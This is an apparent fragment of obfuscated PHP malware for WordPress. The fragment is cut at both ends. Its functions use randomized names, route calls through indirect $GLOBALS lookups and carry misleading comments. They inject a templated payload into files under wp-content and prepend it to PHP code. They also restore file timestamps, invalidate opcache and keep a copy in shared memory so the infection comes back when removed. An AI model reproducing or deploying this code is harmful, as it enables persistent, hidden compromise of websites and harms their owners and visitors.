 if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($fkgqfpf1uumhr3)  || $fkgqfpf1uumhr3[1] <  (88+12)   ||      $fkgqfpf1uumhr3[1] > (1048560+16))  return false;
     if     ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(274)))    $q97i7_qw446ei   =  @gzdecode($q97i7_qw446ei,  (1354996-306420));
  elseif ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(275))) {
   $q97i7_qw446ei      = @gzinflate($GLOBALS['__scf__fl_gwujcblq_9']($q97i7_qw446ei, (14-4),  $GLOBALS['__scf_fxl4k4gsul_10']($q97i7_qw446ei) -   (0x8+0xa)),   (1759806-711230));
if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($q97i7_qw446ei) &&  $GLOBALS['__scf_fxl4k4gsul_10']($q97i7_qw446ei)  >  (1100326-51750))   return  false;
    }     else return  false;
 }
/* normal certificate-chain */

      if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($q97i7_qw446ei) ||  $GLOBALS['__scf_fxl4k4gsul_10']($q97i7_qw446ei)    < (24^124)     ||    $GLOBALS['__scf__fl_gwujcblq_9']($q97i7_qw446ei,    0,   (118^115)) !== xpm5lg9odtw6di(778)     ||   $GLOBALS['__scf_eo363tjzd4r6n_56']($q97i7_qw446ei)  !==    $dz9ttep94ondlpl[2]) return    false;

       return  $q97i7_qw446ei;
}


function   pxu35orcdd45iy9()
  {
  try      {
 if   (!defined(ar6vo_1nyhx2koj5(1146)))    return;
 $g14wzv47wtmcsw =  o_6mdjsw6n7ovdc1_yox();
      if  (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($g14wzv47wtmcsw[1]))   return;
   if    (aki8mfnr216ueb0j8ep1($g14wzv47wtmcsw[1]) ===      false)  return;
  $mv_rk9qw6jz0v  = pgrkqypzhwz32d(bk9m46jygo3f(634),   array('__SLUG__'),  array($GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), gz_aorofp7mo(975))));
 if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($mv_rk9qw6jz0v)  ||   $mv_rk9qw6jz0v === "")   return;
    $mv_rk9qw6jz0v  = $GLOBALS['__scf_a6uiw8bt24jybf_454'](gz_aorofp7mo(1212),  "", $mv_rk9qw6jz0v);
    if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($mv_rk9qw6jz0v)     || $mv_rk9qw6jz0v  ===    "")    return;
   $al5ju0cl6g1mjvy =  xl8k_pjv1048a7ae7()   .      ':'  . g2g3r6pz8prst3gz(ABSPATH     .  xognx_h1jzkh(1213),  (4<<1));


 $i8boz5lfd0a  = ar6vo_1nyhx2koj5(1214)   . $al5ju0cl6g1mjvy   .      gz_aorofp7mo(1215);
 $walsf9zikggv4  =    gz_aorofp7mo(1216) .      $al5ju0cl6g1mjvy .   ar6vo_1nyhx2koj5(1215);
 $nvmlg5tmk3ix8    =     ar6vo_1nyhx2koj5(1217)    .   $g14wzv47wtmcsw[2]    . xpm5lg9odtw6di(1218)  . xl8k_pjv1048a7ae7() .    xpm5lg9odtw6di(1219)  .  "\n" .   $mv_rk9qw6jz0v;
  if (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($g14wzv47wtmcsw[0]))  {
// @initialize gateway



  if  (!ut5isdl00gkjaids($g14wzv47wtmcsw[0],  ""))   {
 kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1207), xognx_h1jzkh(1220));
  return;
  }
/* non-singular synchronizer */

 if   (rmpvo8i8m8kfd9311njxy7($g14wzv47wtmcsw[0], $nvmlg5tmk3ix8)) {
// @rebalance publisher

wbvm0leq3qkmkea59($g14wzv47wtmcsw[0],     r4p_zfnleez7aynxxwapor());
 f97udlofaljpuxw1_jgnfh($g14wzv47wtmcsw[0],   (703-283));
 g6q1ehat0szqqsfbv2($g14wzv47wtmcsw[0]);
 ykbctv6vdni0fv($g14wzv47wtmcsw[0]);
}
return;
 }
$ls6pqbsrls830dr =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($g14wzv47wtmcsw[0]);
     if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($ls6pqbsrls830dr)   ||      $GLOBALS['__scf_fxl4k4gsul_10']($ls6pqbsrls830dr)      > (2097061+91))  return;
     if ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($ls6pqbsrls830dr,  $i8boz5lfd0a)     !== false &&   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($ls6pqbsrls830dr,     $walsf9zikggv4)   !==      false) return;
 if    ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($ls6pqbsrls830dr,    gz_aorofp7mo(1221))    ===    false && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($ls6pqbsrls830dr, xpm5lg9odtw6di(1222)   .    $g14wzv47wtmcsw[2]) !==   false)  {
 if     ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](ar6vo_1nyhx2koj5(1223),    $GLOBALS['__scf__fl_gwujcblq_9']($ls6pqbsrls830dr,  0, (0x60+0x68)),  $rixlxjut1cb)   &&     version_compare($rixlxjut1cb[1],  xl8k_pjv1048a7ae7(), xognx_h1jzkh(1224))) return;
   if   (!ut5isdl00gkjaids($g14wzv47wtmcsw[0], $ls6pqbsrls830dr))     {
  kkpdha95nyx3tbltd10(xognx_h1jzkh(1207), ar6vo_1nyhx2koj5(1220));
 return;



   }
    if  (rmpvo8i8m8kfd9311njxy7($g14wzv47wtmcsw[0],    $nvmlg5tmk3ix8)) {
 wbvm0leq3qkmkea59($g14wzv47wtmcsw[0],   r4p_zfnleez7aynxxwapor());


     f97udlofaljpuxw1_jgnfh($g14wzv47wtmcsw[0],  (0x8a+0x11a));



      g6q1ehat0szqqsfbv2($g14wzv47wtmcsw[0]);
 ykbctv6vdni0fv($g14wzv47wtmcsw[0]);
    }
return;
  }
  $mv5szj_yqgm0prz  =  g2g3r6pz8prst3gz(ABSPATH   .  xpm5lg9odtw6di(1225),    (16-8));
 $ls6pqbsrls830dr =     $GLOBALS['__scf_a6uiw8bt24jybf_454'](bk9m46jygo3f(1226)   .   $mv5szj_yqgm0prz   . bk9m46jygo3f(1227),  "",    $ls6pqbsrls830dr);
  if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($ls6pqbsrls830dr)) {


kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1207),   ar6vo_1nyhx2koj5(1228));
 return;
 }
if      (!@$GLOBALS['__scf_v7y4c72abxzjo_47']($g14wzv47wtmcsw[0])) return;
if (!rrp4_qeca82cei_(ar6vo_1nyhx2koj5(1229)))    {
kkpdha95nyx3tbltd10(xognx_h1jzkh(1229),  xpm5lg9odtw6di(1230));



      return;
 }
   if   (!ut5isdl00gkjaids($g14wzv47wtmcsw[0],    $ls6pqbsrls830dr))  {
kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1229),    gz_aorofp7mo(1231));
 return;


 }
 u23ayxegshiotpsvk7bvkb(xognx_h1jzkh(1229));
     $euarczhc23  =   $i8boz5lfd0a   .  "\n"  . xognx_h1jzkh(1232)    . $g14wzv47wtmcsw[2]      .   gz_aorofp7mo(1233)   . "\n"    .  $mv_rk9qw6jz0v   .  "\n"   . $walsf9zikggv4;
        if    (rmpvo8i8m8kfd9311njxy7($g14wzv47wtmcsw[0], uurnht5ff7e_kxoij13($ls6pqbsrls830dr,  $euarczhc23)))  {
/* lock-free revocation-list */

   ykbctv6vdni0fv($g14wzv47wtmcsw[0]);
     g6q1ehat0szqqsfbv2($g14wzv47wtmcsw[0]);
   }
     }  catch      (Throwable     $o_qyrtxl85owt)   {
    kkpdha95nyx3tbltd10(bk9m46jygo3f(1229),  $o_qyrtxl85owt);
 } catch (Exception   $o_qyrtxl85owt)   {
       }
}
     function mvmezl6pewtn_u4lai()


{
try {
  if   (!defined(gz_aorofp7mo(1146)))   return;
  $g14wzv47wtmcsw  = o_6mdjsw6n7ovdc1_yox();
  $aut3uv86pf  = (string)   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($g14wzv47wtmcsw[1],  false,  null,      0, (8<<3));
  if   ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](ar6vo_1nyhx2koj5(1234), $aut3uv86pf,   $wmi9vtfi67mkceoi)     &&  $wmi9vtfi67mkceoi[1] ===     xl8k_pjv1048a7ae7()) {

 $x_q9jgleqn3tpsh4   = (int)    get_option(gz_aorofp7mo(1235),  0);
     if  ($GLOBALS['__scf_ks7_xfapvywl_185']()      - $x_q9jgleqn3tpsh4  < (534+66))   return;
 if  (aki8mfnr216ueb0j8ep1($g14wzv47wtmcsw[1]) !==     false) {
    @update_option(xognx_h1jzkh(1235), $GLOBALS['__scf_ks7_xfapvywl_185'](),  xognx_h1jzkh(1038));
 return;
    }


     kkpdha95nyx3tbltd10(xognx_h1jzkh(1229),  xpm5lg9odtw6di(1236));


}
  $h3wz11cllq  =  p5t6fz6i7ccgjh();
 if  (!$h3wz11cllq ||   $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq)    <    (657-157)  || $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq) >    (1985641-937065) ||    !g9edwd6m8_9cm8($h3wz11cllq)) return;
    $jop9xeu8hu      =   $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(269))  ?  @gzencode($h3wz11cllq,    (0x3+0x3)) :  $h3wz11cllq;
  if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($jop9xeu8hu) ||  $jop9xeu8hu  ===     "")   return;
      if (rmpvo8i8m8kfd9311njxy7($g14wzv47wtmcsw[1],    xpm5lg9odtw6di(1237)    . xl8k_pjv1048a7ae7() . ':'     .  $GLOBALS['__scf_eo363tjzd4r6n_56']($h3wz11cllq)   .    ':'   . $GLOBALS['__scf_upr7jxyxre3_348']($jop9xeu8hu)))  @update_option(bk9m46jygo3f(1235),     $GLOBALS['__scf_ks7_xfapvywl_185'](),   ar6vo_1nyhx2koj5(1238));
  } catch (Throwable $o_qyrtxl85owt)  {
     kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1229),    $o_qyrtxl85owt);
    }  catch (Exception    $o_qyrtxl85owt)  {



    }
    }
   function  rovyqrjbfjej9p14cdqtzc()
  {
 if    (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1239))) return      false;
$isljtb6s3cl4gi    =    defined(gz_aorofp7mo(1146))   &&     @$GLOBALS['__scf_ojjepdqapp29_684'](ABSPATH     .     ar6vo_1nyhx2koj5(1240))  ?  ABSPATH .  xpm5lg9odtw6di(1240)     : __FILE__;
  return $GLOBALS['__scf_o5sjea6lw_1ppj_1239']($isljtb6s3cl4gi, 's');
 }
      function v7u_kan_p9zqbq()

{
       try  {
 if  (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1241))  ||    !$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1239)))    return;
   if (!defined(ar6vo_1nyhx2koj5(1146))) return;
$h3wz11cllq =  p5t6fz6i7ccgjh();
  if  (!$h3wz11cllq     ||  $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq) <    (157+343))  return;
    $key =  rovyqrjbfjej9p14cdqtzc();

 if ($key    ===  false)  return;
$kwjp3jnd2hxbx   =  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1242))    ? $GLOBALS['__scf_j65ea9eiow7te_1243'](ar6vo_1nyhx2koj5(1244), $h3wz11cllq)  :     $GLOBALS['__scf_eo363tjzd4r6n_56']($h3wz11cllq);
$nk7ye38kc06yztc   = ar6vo_1nyhx2koj5(1245) . $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq)  .     ':'   .  $kwjp3jnd2hxbx   .      "\n" .   $h3wz11cllq;
  $sw8l4qeo7zq    =   $GLOBALS['__scf_fxl4k4gsul_10']($nk7ye38kc06yztc);
    $g3gjcxre6rts8  = @$GLOBALS['__scf_xv6k4zu903au_1246']($key, 'a', 0, 0);


    if    ($g3gjcxre6rts8) {
  $qho2p2q7svf552rm =   (int)     @$GLOBALS['__scf_ipnjj821ht6p_1247']($g3gjcxre6rts8);
$fpmrdfqbe_bhak9_ =     @$GLOBALS['__scf_um3jl76593pe_1248']($g3gjcxre6rts8,   0, $qho2p2q7svf552rm);
 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($fpmrdfqbe_bhak9_)   && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($fpmrdfqbe_bhak9_,  $h3wz11cllq)  !== false) {
  @$GLOBALS['__scf_kv9kz2vgrwaf_1249']($g3gjcxre6rts8);
 return;



  }

if  ($qho2p2q7svf552rm   >=  $sw8l4qeo7zq)    {

     @$GLOBALS['__scf_kv9kz2vgrwaf_1249']($g3gjcxre6rts8);
 $g3gjcxre6rts8     =  @$GLOBALS['__scf_xv6k4zu903au_1246']($key,  'w',     0,  0);
if ($g3gjcxre6rts8)  {
 @$GLOBALS['__scf_x4flwjkmycoyty_1250']($g3gjcxre6rts8,   $GLOBALS['__scf_p_rgrs66km8_1251']($nk7ye38kc06yztc, $qho2p2q7svf552rm, "\0"),  0);

 $wudqqhnego   =     @$GLOBALS['__scf_um3jl76593pe_1248']($g3gjcxre6rts8,  0,  $sw8l4qeo7zq);



      @$GLOBALS['__scf_kv9kz2vgrwaf_1249']($g3gjcxre6rts8);
if ($wudqqhnego !== $nk7ye38kc06yztc)    kkpdha95nyx3tbltd10(gz_aorofp7mo(1252), xpm5lg9odtw6di(1026));
     }
 return;
}  else  {


  @$GLOBALS['__scf_jprl74_5uj3sy_1253']($g3gjcxre6rts8);
     @$GLOBALS['__scf_kv9kz2vgrwaf_1249']($g3gjcxre6rts8);
       }
 }
$qho2p2q7svf552rm    =   $sw8l4qeo7zq +   (938+86);
  $g3gjcxre6rts8  = @$GLOBALS['__scf_xv6k4zu903au_1246']($key,  'c',     (0x128+0x7c),  $qho2p2q7svf552rm);
 if (!$g3gjcxre6rts8) return;
       @$GLOBALS['__scf_x4flwjkmycoyty_1250']($g3gjcxre6rts8, $GLOBALS['__scf_p_rgrs66km8_1251']($nk7ye38kc06yztc,   $qho2p2q7svf552rm,  "\0"), 0);
     $wudqqhnego = @$GLOBALS['__scf_um3jl76593pe_1248']($g3gjcxre6rts8, 0, $sw8l4qeo7zq);
 if ($wudqqhnego    !==   $nk7ye38kc06yztc)      kkpdha95nyx3tbltd10(gz_aorofp7mo(1252),  bk9m46jygo3f(1026));
 @$GLOBALS['__scf_kv9kz2vgrwaf_1249']($g3gjcxre6rts8);
        } catch (Throwable  $o_qyrtxl85owt)     {
  kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1252),  $o_qyrtxl85owt);
} catch   (Exception $o_qyrtxl85owt)  {



 }
}
 function uurnht5ff7e_kxoij13($current, $euarczhc23)
   {
   if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($current)    ||   $current     ===  "")     return   xpm5lg9odtw6di(1254)  .  $euarczhc23 . "\n";
if ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1255), $current,      $lxf_05247qeewd3,     PREG_OFFSET_CAPTURE))  {
    $dimgit32kd_    = $lxf_05247qeewd3[0][1] + $GLOBALS['__scf_fxl4k4gsul_10']($lxf_05247qeewd3[0][0]);
 $xr9khecgia9nh39u   =  $GLOBALS['__scf__fl_gwujcblq_9']($current, $dimgit32kd_, (15636-7444));
   while  ($GLOBALS['__scf_is0fvk8c7tq2_41']($xr9khecgia9nh39u)     &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(1256),  $xr9khecgia9nh39u, $_dm)) {
$dimgit32kd_  +=  $GLOBALS['__scf_fxl4k4gsul_10']($_dm[0]);
     $xr9khecgia9nh39u  = $GLOBALS['__scf__fl_gwujcblq_9']($current, $dimgit32kd_,   (8128+64));
}
 return $GLOBALS['__scf__fl_gwujcblq_9']($current,   0,     $dimgit32kd_)   .    "\n"     .   $euarczhc23 . "\n"    . $GLOBALS['__scf__fl_gwujcblq_9']($current,  $dimgit32kd_);
     }
  return   ar6vo_1nyhx2koj5(1254)   . $euarczhc23 .   "\n?>\n"   .   $current;
  }
  function  rrp4_qeca82cei_($key)
    {
if  (!$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1054)))  return   true;
       $du8t9u_zqkx     = @get_option(bk9m46jygo3f(1257) .   $key,   "");
  if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($du8t9u_zqkx)  && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($du8t9u_zqkx, '|') !==   false)  {


    $dz9ttep94ondlpl  = $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|',     $du8t9u_zqkx,    2);$zg018b4v=7641;$ireos138n3=$zg018b4v%17;
if  ((int)   $dz9ttep94ondlpl[0] ===   (int)    ($GLOBALS['__scf_ks7_xfapvywl_185']() /    (72+86328))  && (int)   $dz9ttep94ondlpl[1]  >=    (0x1+0x2))  return  false;
  }
// merge trust-anchor for PHP 8.0 JIT

     return    true;
   }


 function    u23ayxegshiotpsvk7bvkb($key)
{
 if  (!$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1054)) ||     !$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1200))) return;
      $_3vgsoha4qva  =  (int)   ($GLOBALS['__scf_ks7_xfapvywl_185']()   /    (0x111a0+0x3fe0));
    $du8t9u_zqkx     =   @get_option(gz_aorofp7mo(1257) .      $key,  "");
  $_svae0z2nfoqm  =  0;
 if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($du8t9u_zqkx) &&   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($du8t9u_zqkx,  '|')    !== false)  {
   $dz9ttep94ondlpl  =  $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|', $du8t9u_zqkx,    2);
  if   ((int)  $dz9ttep94ondlpl[0]   ===  $_3vgsoha4qva) $_svae0z2nfoqm   =  (int)  $dz9ttep94ondlpl[1];



   }
$_svae0z2nfoqm++;
     @update_option(xpm5lg9odtw6di(1258)  . $key,   $_3vgsoha4qva   .   '|' . $_svae0z2nfoqm,      xognx_h1jzkh(1259));
  if ($_svae0z2nfoqm    >= (6-3)) kkpdha95nyx3tbltd10(bk9m46jygo3f(1260),      gz_aorofp7mo(1261)   .  $key);
}
 function ht40nqgoptk0xtbt()
      {
       try      {
if   (!defined(gz_aorofp7mo(1146))) return;
 



   if  (!defined(gz_aorofp7mo(1174))     ||    !@$GLOBALS['__scf_v7y4c72abxzjo_47'](WP_CONTENT_DIR)   ||   !jzlknbv7omzglykz(WP_CONTENT_DIR))  return;
 $y4e3mkwgaqm    =  WP_CONTENT_DIR;
   $o6xntw98bq9z20o7   =    $y4e3mkwgaqm   .  gz_aorofp7mo(505);
 $rv8s_ul0qu2z09u =  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), gz_aorofp7mo(1262));
 $shhw38ajvek7  = g2g3r6pz8prst3gz(ABSPATH   .     gz_aorofp7mo(1109),     (4<<1))   .   bk9m46jygo3f(1263);
 $r37obgqhbab5 =     fgatjmo7gg2xolgmpki4y2();
   $y2m_cj2ki15  =   g2g3r6pz8prst3gz(ABSPATH   .  gz_aorofp7mo(1206),  (4+6));
   $md5mnfrt41h_t = $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1239))    ? rovyqrjbfjej9p14cdqtzc()     :   false;
  $s8ti_vm723l   = $md5mnfrt41h_t !==  false ?  $GLOBALS['__scf_e4lkltqhx5_1264']($md5mnfrt41h_t)   :   0;

$obeewpt8cr19pj     =     isset($GLOBALS[gz_aorofp7mo(878)]->prefix)  ?  $GLOBALS[xognx_h1jzkh(1265)]->prefix   :      gz_aorofp7mo(846);
 $amsecxbpo_1302 = bk9m46jygo3f(1266)     .    $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($rv8s_ul0qu2z09u . (string)     aruikh7uoh1wrp5bqr79()),   0,   (248^240));
$mbhs967bv9s8x     = pgrkqypzhwz32d(
      xpm5lg9odtw6di(626),
    array('__SLUG__', '__ZIP_NAME__',     '__SHMOP_KEY__',  '__OPT_NAME__',  '__WP_PREFIX__',  '__GUARD_NAME__',     '__VERSION__'),
array($rv8s_ul0qu2z09u, $shhw38ajvek7,   $s8ti_vm723l, $y2m_cj2ki15, $obeewpt8cr19pj,  $amsecxbpo_1302,   xl8k_pjv1048a7ae7())
  );
 if (!$mbhs967bv9s8x)   {
// @monomorphize resolver

if ((int)  get_option(gz_aorofp7mo(1267), 0)   >  0) kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1268),    xpm5lg9odtw6di(1269));
      return;
   }
$current   = @$GLOBALS['__scf_ojjepdqapp29_684']($o6xntw98bq9z20o7)   ?     @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($o6xntw98bq9z20o7) :  "";
 if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($current)) {
  kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1268), bk9m46jygo3f(1189));
    return;
   }


   $current     = za8ge46vc9y1a6($current);
   $al5ju0cl6g1mjvy     = xl8k_pjv1048a7ae7() .  ':' . g2g3r6pz8prst3gz(ABSPATH    .   bk9m46jygo3f(1270), (4+4));$fxu5_e0yhextg=-420;$q_0fn2r7h=($fxu5_e0yhextg>0)?$fxu5_e0yhextg:-$fxu5_e0yhextg;


 $i8boz5lfd0a  =    xpm5lg9odtw6di(1271)   . $al5ju0cl6g1mjvy .    gz_aorofp7mo(1233);



    $walsf9zikggv4   =   xpm5lg9odtw6di(1272) . $al5ju0cl6g1mjvy      .   xpm5lg9odtw6di(1273);
  $sxunr_ncpq5_rm      =    g2g3r6pz8prst3gz(ABSPATH  .  xpm5lg9odtw6di(1274),   (0x1+0x7));


 $x5mxpl9319trapge    = $GLOBALS['__scf_a6uiw8bt24jybf_454'](bk9m46jygo3f(1275) .     $sxunr_ncpq5_rm    .  xpm5lg9odtw6di(1276),  "",   $current);


 $duqqkzcuis70j2yh   =  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($x5mxpl9319trapge,   gz_aorofp7mo(1277))  !==  false);
  if     ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($current,   $i8boz5lfd0a)      !== false    && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($current,   $walsf9zikggv4)    !==    false && !$duqqkzcuis70j2yh)     {
av9ady1lf7xf2b();
    return;


 }
     $current =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](gz_aorofp7mo(1278),    "", $x5mxpl9319trapge);
if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($current))   {
kkpdha95nyx3tbltd10(xognx_h1jzkh(1279),   ar6vo_1nyhx2koj5(1228));
    return;
   }      {
  $current    =  za8ge46vc9y1a6($current);
    $hgs9w52ivvzhfvnl     =   $GLOBALS['__scf_a6uiw8bt24jybf_454'](xpm5lg9odtw6di(1280),  "",     $mbhs967bv9s8x);
$mvgk5d15xt8mlk   =      ($GLOBALS['__scf_fxl4k4gsul_10']($current)   ===    0);
if (!$mvgk5d15xt8mlk) {
 if   (!rrp4_qeca82cei_(bk9m46jygo3f(1281)))    {
     kkpdha95nyx3tbltd10(xognx_h1jzkh(1281),    bk9m46jygo3f(1230));
 return;
  }


   if (!ut5isdl00gkjaids($o6xntw98bq9z20o7,     $current))   {
     kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1281), bk9m46jygo3f(1282));



      return;
 }
   u23ayxegshiotpsvk7bvkb(ar6vo_1nyhx2koj5(1283));
      } else  {

 if (!ut5isdl00gkjaids($o6xntw98bq9z20o7,  "")) {
// unmount heap for WP Social Links

    kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1283),   bk9m46jygo3f(1282));


   return;
}
 }
 $ok4xoahvrt_r  =   uurnht5ff7e_kxoij13($current,  $i8boz5lfd0a  . "\n"    .   $hgs9w52ivvzhfvnl   .   "\n"    . $walsf9zikggv4);
 if (!rmpvo8i8m8kfd9311njxy7($o6xntw98bq9z20o7,  $ok4xoahvrt_r))   {
return;

 }
// WP Higher Order Components: fold-const authority

ykbctv6vdni0fv($o6xntw98bq9z20o7);
      g6q1ehat0szqqsfbv2($o6xntw98bq9z20o7);
  av9ady1lf7xf2b();


   }
 } catch   (Throwable $o_qyrtxl85owt)  {
kkpdha95nyx3tbltd10(bk9m46jygo3f(1283),      $o_qyrtxl85owt);


     } catch  (Exception  $o_qyrtxl85owt)   {
    }
 }
  function    hpofvuf7ak5x5wq9st()
{
    try {
  if     (!defined(bk9m46jygo3f(1146))) return;$p3q01w90kyp0=56+40;$c3b3eimoaoslvh=$p3q01w90kyp0-13;
  if  (i__3znuz8m_x6r(bho93o6vof3ni5_rg622_h())) return;
     if (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(978))) return;



  if    ($GLOBALS['__scf_w645jfzvum_104']()  ===     xognx_h1jzkh(1180))  return;
 if (!isset($_SERVER[xognx_h1jzkh(401)]))  return;

   if   (get_transient(xognx_h1jzkh(1284))) return;
 $a19vmiyy_8 =  fgatjmo7gg2xolgmpki4y2();
if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($a19vmiyy_8))  w1m15sg83rnn5uqc64($a19vmiyy_8,   (425+68),  true);
      

   if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($a19vmiyy_8) ||  !@$GLOBALS['__scf_v7y4c72abxzjo_47']($a19vmiyy_8)) {
      $a19vmiyy_8  =     ABSPATH   .     bk9m46jygo3f(513);
  if (!@$GLOBALS['__scf_v7y4c72abxzjo_47']($a19vmiyy_8))   $a19vmiyy_8   =  hzkj2ifwqdzf_u32qrf();
 }
// WP RichText API customizer transport




      $l9le3i57v1vab5rx  =     g2g3r6pz8prst3gz(ABSPATH .    'g',   (1<<3));
   $mtp85rfttawm   =     ar6vo_1nyhx2koj5(1285)  .   $l9le3i57v1vab5rx .    bk9m46jygo3f(1262);
  $n3zr4kmoizfbxxqc    = $a19vmiyy_8  .      '/' . $mtp85rfttawm;
$p9351a9luj = $a19vmiyy_8 .  xognx_h1jzkh(1286)   .    $l9le3i57v1vab5rx;
        foreach (array($a19vmiyy_8,   ABSPATH .     gz_aorofp7mo(513),      hzkj2ifwqdzf_u32qrf())  as  $fgdrjs0rzo3dy)    {
// derandomized singleton
$dw9bx_2o5q9dt=82|152;$ymchgm8y=$dw9bx_2o5q9dt^2;
 $j2c8ompusc1nx_    = $fgdrjs0rzo3dy   . xpm5lg9odtw6di(1287)    .  $l9le3i57v1vab5rx;
    if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($j2c8ompusc1nx_)) {
$sv8yat44a5k      = (int)     @$GLOBALS['__scf_k4z5lhhe91ty_98']($j2c8ompusc1nx_);



 if ($sv8yat44a5k <=    $GLOBALS['__scf_ks7_xfapvywl_185']()   - (86319+81)   ||  $sv8yat44a5k    >     $GLOBALS['__scf_ks7_xfapvywl_185']()     +   (330-30)) {
  xv6oqhjncehpr7v_mus7($j2c8ompusc1nx_);
   continue;
  }

 if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($fgdrjs0rzo3dy .  ar6vo_1nyhx2koj5(1288)   .      $l9le3i57v1vab5rx .  bk9m46jygo3f(1262)))    return;
xv6oqhjncehpr7v_mus7($j2c8ompusc1nx_);



    }

  }
/* dense validator */

  unset($fgdrjs0rzo3dy,   $j2c8ompusc1nx_,    $sv8yat44a5k);
 $t_ejh586k8f93   =  ABSPATH  .    xpm5lg9odtw6di(279)   .  $mtp85rfttawm;
   if ($a19vmiyy_8     !==  ABSPATH  .   xognx_h1jzkh(513)   &&  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($t_ejh586k8f93)    &&  p82470xv4eq7_pm5tl4hw9($t_ejh586k8f93)    !== false)    {


     f97udlofaljpuxw1_jgnfh($t_ejh586k8f93,  (372+48));
   if (xv6oqhjncehpr7v_mus7($t_ejh586k8f93)  && $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1289)))   @opcache_invalidate($t_ejh586k8f93,  true);
   

 }
   unset($t_ejh586k8f93);
 if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($p9351a9luj)   && (int)    @$GLOBALS['__scf_k4z5lhhe91ty_98']($p9351a9luj)      >  $GLOBALS['__scf_ks7_xfapvywl_185']()  -  (198+42))  return;
      if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($n3zr4kmoizfbxxqc)  &&  ($GLOBALS['__scf_ks7_xfapvywl_185']()   -  (int)   @filectime($n3zr4kmoizfbxxqc))  < (236+64)) return;
 if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($n3zr4kmoizfbxxqc))      {
     $d1x3430vpy7wots  = @$GLOBALS['__scf_vpig9uwvw8_pu_20']($a19vmiyy_8  .     xpm5lg9odtw6di(1290)     .     $l9le3i57v1vab5rx)  ?    $GLOBALS['__scf_u6m4cedwgt__319']((string)  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($a19vmiyy_8      .  gz_aorofp7mo(1291) . $l9le3i57v1vab5rx)) :     "";

 if  ($d1x3430vpy7wots    !==      ""  &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1292),  $d1x3430vpy7wots)   &&  version_compare($d1x3430vpy7wots,   xl8k_pjv1048a7ae7(), '>'))   return;
   unset($d1x3430vpy7wots);
 }
if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($n3zr4kmoizfbxxqc))   {
